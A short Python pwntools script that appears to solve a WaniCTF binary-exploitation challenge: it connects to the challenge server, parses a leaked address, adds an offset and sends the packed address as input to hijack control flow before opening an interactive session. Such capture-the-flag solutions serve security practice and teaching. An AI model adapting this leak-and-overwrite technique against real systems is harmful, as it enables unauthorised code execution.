from pwn import p64, remote, log

r = remote('chal-lz56g6.wanictf.org', 9004)

r.recvuntil('= ')

flag = int(r.recv(14).decode(), 16) + 0x17

log.info(f"Flag(): {hex(flag)}")

r.recvline()

for i in range(0, 4):
    if(i != 3):
        r.sendlineafter(": ", b"A")
        r.sendlineafter(": ", b"1")
        r.sendlineafter(": ", b"2")
    
    else:
        r.sendlineafter(": ", p64(flag))
        r.sendlineafter(": ", b".")
        r.sendlineafter(": ", b"99")
        r.interactive()
        